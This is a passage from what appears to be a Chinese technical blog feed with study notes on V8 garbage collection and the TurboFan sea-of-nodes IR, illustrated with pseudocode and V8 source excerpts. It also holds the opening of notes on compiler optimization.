      <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="对象-头-域"><a href="#对象-头-域" class="headerlink" title="对象/头/域"></a>对象/头/域</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071357.png" alt=""></p><h3 id="mutator"><a href="#mutator" class="headerlink" title="mutator"></a>mutator</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071247.png" alt=""></p><h3 id="根-root"><a href="#根-root" class="headerlink" title="根(root)"></a>根(root)</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071052.png" alt=""></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="Cheney的GC复制算法"><a href="#Cheney的GC复制算法" class="headerlink" title="Cheney的GC复制算法"></a>Cheney的GC复制算法</h3><p>Cheney的GC复制算法不是递归地，而是迭代地进行复制。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">copying()&#123;</span><br><span class="line">    scan = $<span class="built_in">free</span> = $to_start </span><br><span class="line">    <span class="keyword">for</span>(r : $roots)</span><br><span class="line">        *r = copy(*r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(scan != $<span class="built_in">free</span>) </span><br><span class="line">        <span class="keyword">for</span>(child : children(scan))</span><br><span class="line">            *child = copy(*child) </span><br><span class="line">        scan += scan.size</span><br><span class="line">    </span><br><span class="line">    swap($from_start, $to_start) &#125;</span><br></pre></td></tr></table></figure></p><p>在第2行将scan和<code>$free</code>的两个指针初始化。scan 是用于搜索复制完成的对象的指针。<code>$free</code>是指向分块开头的指针。<br>首先复制的是直接从根引用的对象，用到的是第3行和第4行。<br>在第6行到第9行搜索复制完成的对象，迭代复制其子对象。最后把From空间和 To空间互换就结束了。Cheney的GC复制算法中的关键点仍是copy()函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy(obj)&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_pointer_to_heap(obj.forwarding, $to_start) == FALSE)</span><br><span class="line">        copy_data($<span class="built_in">free</span>, obj, obj.size) obj.forwarding = $<span class="built_in">free</span></span><br><span class="line">        $<span class="built_in">free</span> += obj.size</span><br><span class="line">    <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在第2行检查参数obj是不是已经复制完毕了。<br>对于is_pointer_to_heap(obj.forwarding, $to_start)，如果 obj.forwarding 是指向To空间的指针则返回TRUE，如果不是(即非指针或指向From空间的指针)则返回FALSE。<br>在第3行复制对象，在第4行对forwarding指针进行设定。forwarding指针利用的是field1。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163100.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163127.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163606.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163619.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-31-163705.png" alt=""></p><h3 id="分代垃圾回收"><a href="#分代垃圾回收" class="headerlink" title="分代垃圾回收"></a>分代垃圾回收</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073113.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073126.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073138.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073154.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073202.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073212.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073225.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073241.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073249.png" alt=""></p><h4 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073311.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073319.png" alt=""></p><h3 id="增量式垃圾回收（Incremental-GC）"><a href="#增量式垃圾回收（Incremental-GC）" class="headerlink" title="增量式垃圾回收（Incremental GC）"></a>增量式垃圾回收（Incremental GC）</h3><p>描述增量式垃圾回收的算法时我们有个方便的概念，那就是Edsger W. Dijkstra等人提出的三色标记算法(Tri-color marking)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-070255.png" alt=""><br><strong>V8使用每个对象的两个mark-bits和一个标记工作栈来实现标记。两个mark-bits编码三种颜色：白色（00），灰色（10）和黑色（11）。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072039.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072221.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072306.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072343.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072740.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-072949.png" alt=""></p><h4 id="Write-Barrier-1"><a href="#Write-Barrier-1" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073355.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-073441.png" alt=""></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li><li>垃圾回收的算法和实现</li></ul>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
            <tag> GC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 IR连连看</title>
      <link href="/2018/08/21/v8_graph/"/>
      <url>/2018/08/21/v8_graph/</url>
      <content type="html"><![CDATA[<h2 id="v8-Graph"><a href="#v8-Graph" class="headerlink" title="v8 Graph"></a>v8 Graph</h2><p>首先说一个结论，v8的graph都是由下往上遍历。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-034849.png" alt=""><br>具体举一个例子,从json里随便提取一句<br><code>{&quot;source&quot;:0,&quot;target&quot;:13,&quot;index&quot;:3,&quot;type&quot;:&quot;control&quot;},</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035048.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdges</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; node-&gt;InputCount(); i++) &#123;</span><br><span class="line">    Node* input = node-&gt;InputAt(i);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">    PrintEdge(node, i, input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintEdge</span><span class="params">(Node* from, <span class="keyword">int</span> index, Node* to)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (first_edge_) &#123;</span><br><span class="line">    first_edge_ = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    os_ &lt;&lt; <span class="string">",\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* edge_type = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; NodeProperties::FirstValueIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"unknown"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstContextIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"value"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstFrameStateIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"context"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstEffectIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"frame-state"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstControlIndex(from)) &#123;</span><br><span class="line">    edge_type = <span class="string">"effect"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    edge_type = <span class="string">"control"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  os_ &lt;&lt; <span class="string">"&#123;\"source\":"</span> &lt;&lt; SafeId(to) &lt;&lt; <span class="string">",\"target\":"</span> &lt;&lt; SafeId(from)</span><br><span class="line">      &lt;&lt; <span class="string">",\"index\":"</span> &lt;&lt; index &lt;&lt; <span class="string">",\"type\":\""</span> &lt;&lt; edge_type &lt;&lt; <span class="string">"\"&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>事实上反映到代码里，它是这样的。<br>也就是说,from对应node，input对应to。<br>画图的时候，source即to，target即from。<br><strong>注意这里的from和to到底指谁，在看代码的时候才不会迷失。</strong></p><p>以一个函数为例<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> GraphReducer::ReplaceWithValue(Node* node, Node* value, Node* effect,</span><br><span class="line">                                    Node* control) &#123;</span><br><span class="line">  <span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (control == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;ControlInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    control = NodeProperties::GetControlInput(node);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Requires distinguishing between value, effect and control edges.</span></span><br><span class="line">  <span class="keyword">for</span> (Edge edge : node-&gt;use_edges()) &#123;</span><br><span class="line">    Node* <span class="keyword">const</span> user = edge.from();</span><br><span class="line">    DCHECK(!user-&gt;IsDead());</span><br><span class="line">    <span class="keyword">if</span> (NodeProperties::IsControlEdge(edge)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfSuccess) &#123;</span><br><span class="line">        Replace(user, control);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user-&gt;opcode() == IrOpcode::kIfException) &#123;</span><br><span class="line">        DCHECK_NOT_NULL(dead_);</span><br><span class="line">        edge.UpdateTo(dead_);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DCHECK_NOT_NULL(control);</span><br><span class="line">        edge.UpdateTo(control);</span><br><span class="line">        Revisit(user);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">      DCHECK_NOT_NULL(effect);</span><br><span class="line">      edge.UpdateTo(effect);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      DCHECK_NOT_NULL(value);</span><br><span class="line">      edge.UpdateTo(value);</span><br><span class="line">      Revisit(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>Edge edge : node-&gt;use_edges()<br>use_edges即图中的红色边。绿色边代表的是input，红色边代表use<br>这其实很好理解，如果我们来写一个双向图搜索，在设计的时候，每个节点肯定有进行前后遍历的两条边可以选择，v8也是这么设计的。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT_PRIVATE</span> <span class="title">Node</span> <span class="title">final</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InputEdges</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> InputEdges <span class="title">input_edges</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inputs</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> Inputs <span class="title">inputs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UseEdges</span> <span class="title">final</span> &#123;</span></span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">typedef</span> Edge value_type;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">iterator</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        explicit UseEdges(Node* node) : node_(node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span>:</span><br><span class="line">        Node* node_;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">UseEdges <span class="title">use_edges</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> UseEdges(<span class="keyword">this</span>); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035742.png" alt=""></p><ul><li>Node* const user = edge.from();</li></ul><p><strong>还记得每条边的from么？对，就是target，现在知道对应谁了么？上一个和下一个都是相对的概念，只是我们要知道究竟对应的是谁即可</strong></p><ul><li>接下来代码是一个选择分支，我选一个else if分析<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">    DCHECK_NOT_NULL(effect);</span><br><span class="line">    edge.UpdateTo(effect);</span><br><span class="line">    Revisit(user);</span><br></pre></td></tr></table></figure></li></ul><p>首先effect来源于<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里是取的原来的节点的输入边，假设它就是effect input。<br>那么假设我们现在就是0-&gt;5-&gt;13，0即effect，5即node，13即user<br>edge是5-&gt;13的这条边。<br>然后我们edge.UpdateTo(effect);<br><strong>还记得每条边的from么？是的，这个to本来应该是5，这里就是把5-&gt;13变成了0-&gt;13，就移走了原本在这个路径上的这个节点，要注意的是这个移走并不是直接移除，因为它可能在其他路径上还被用到，只是不在这条路径上了，具体的看我贴的源码（fuck the source code…)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateTo</span><span class="params">(Node* new_to)</span> </span>&#123;</span><br><span class="line">    Node* old_to = *input_ptr_;</span><br><span class="line">    <span class="keyword">if</span> (old_to != new_to) &#123;</span><br><span class="line">      <span class="keyword">if</span> (old_to) old_to-&gt;RemoveUse(use_);</span><br><span class="line">      *input_ptr_ = new_to;</span><br><span class="line">      <span class="keyword">if</span> (new_to) new_to-&gt;AppendUse(use_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">void</span> Node::RemoveUse(Use* use) &#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;prev) &#123;</span><br><span class="line">    DCHECK_NE(first_use_, use);</span><br><span class="line">    use-&gt;prev-&gt;next = use-&gt;next;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK_EQ(first_use_, use);</span><br><span class="line">    first_use_ = use-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;next) &#123;</span><br><span class="line">    use-&gt;next-&gt;prev = use-&gt;prev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-050445.png" alt=""><br>如图有两条红线，通过一个use链链接起来。</p><h2 id="v8-IR"><a href="#v8-IR" class="headerlink" title="v8 IR"></a>v8 IR</h2><h3 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea-of-Nodes"></a>Sea-of-Nodes</h3><p>v8的IR是Sea-of-Nodes，可以说是一种Program Dependence Graph，其宗旨是“在统一的表达形式下，把分析进行彻底”<br>用这样的IR所表达的程序里完全不需要“变量”的概念了，一切都是经过透彻分析后的“值”。各种操作并不操作变量，而是从依赖获取输入值，运算后产生新的值。每个“值”自身会携带足够依赖信息来判明它在怎样的路径上有效，依赖的数据输入是哪些；<br>TurboFan的依赖信息有三种，Control, Data, Effect</p><ul><li>Control Dependence（控制依赖）可以看作是常规控制流图反过来画。不是基本块持有一个线性列表里面装着节点，而是每个节点都记录着自己的控制依赖是谁——要哪个前驱控制节点执行到的时候我才可以执行。</li><li>Data Dependence很简单，就是use-def链，换句话说一个节点的数据输入都是谁。例如说 a + b，这个“+”的数据依赖就是a和b。</li><li>Effect Dependence则记录“副作用的顺序”——主要就是内存操作的顺序。它只记录顺序而不必维护SSA形式的其它特性。</li></ul><p>基于此，v8放宽了operation的执行顺序，由effect edges来管理stateful operations的执行顺序，且保留了控制流图的“骨架”<br>举几个简单的例子<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073626.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073636.png" alt=""></p><h3 id="Iterative-Reduction"><a href="#Iterative-Reduction" class="headerlink" title="Iterative Reduction"></a>Iterative Reduction</h3><p>需要提一下的是v8的reduce，在每次JIT phase结束的时候，都会根据当前的graph进行Reduce<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073734.png" alt=""><br>整个reduce是从代码最后的End节点开始进行DFS,先遍历子节点，然后遍历自己，记录state改变的节点，将其放入revisit栈，在所有节点遍历完后，对这些需要重新遍历的节点revisit.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> GraphReducer::ReduceNode(Node* node) &#123;</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  Push(node);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!stack_.empty()) &#123;</span><br><span class="line">      <span class="comment">// Process the node on the top of the stack, potentially pushing more or</span></span><br><span class="line">      <span class="comment">// popping the node off the stack.</span></span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!revisit_.empty()) &#123;</span><br><span class="line">      <span class="comment">// If the stack becomes empty, revisit any nodes in the revisit queue.</span></span><br><span class="line">      Node* <span class="keyword">const</span> node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      <span class="keyword">if</span> (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        <span class="comment">// state can change while in queue.</span></span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Run all finalizers.</span></span><br><span class="line">      <span class="keyword">for</span> (Reducer* <span class="keyword">const</span> reducer : reducers_) reducer-&gt;Finalize();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if we have new nodes to revisit.</span></span><br><span class="line">      <span class="keyword">if</span> (revisit_.empty()) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Reduction reduction = (*i)-&gt;Reduce(node);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075114.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075120.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075125.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075131.png" alt=""></p><h3 id="Lowering-to-Machine"><a href="#Lowering-to-Machine" class="headerlink" title="Lowering to Machine"></a>Lowering to Machine</h3><p>事实上IR的node是随着JIT phase逐层下降接近至Machine的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075326.png" alt=""><br>一个JSxxx node可能会变成更多个Machine node<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075359.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>哈工大编译优化笔记</title>
      <link href="/2018/08/08/optimize/"/>
      <url>/2018/08/08/optimize/</url>
      <content type="html"><![CDATA[<h2 id="什么是基本块？"><a href="#什么是基本块？" class="headerlink" title="什么是基本块？"></a>什么是基本块？</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022106.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022128.png" alt=""></p><h2 id="什么是流图"><a href="#什么是流图" class="headerlink" title="什么是流图"></a>什么是流图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-021814.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022012.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022026.png" alt=""></p><h2 id="优化的分类"><a href="#优化的分类" class="headerlink" title="优化的分类"></a>优化的分类</h2><ul><li>机器无关优化<ul><li>针对中间代码</li></ul></li><li>局部代码优化<ul><li>单个基本块范围内的优化</li></ul></li><li>全局代码优化<ul><li>多个基本块的优化<h2 id="常用优化方法"><a href="#常用优化方法" class="headerlink" title="常用优化方法"></a>常用优化方法</h2><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024124.png" alt=""><h3 id="删除公共子表达式"><a href="#删除公共子表达式" class="headerlink" title="删除公共子表达式"></a>删除公共子表达式</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022222.png" alt=""><br>例子如下，先看B5，对它进行局部和全局公共子表达式消除。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022339.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022629.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022703.png" alt=""><br>再看B6<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022855.png" alt=""><br><img 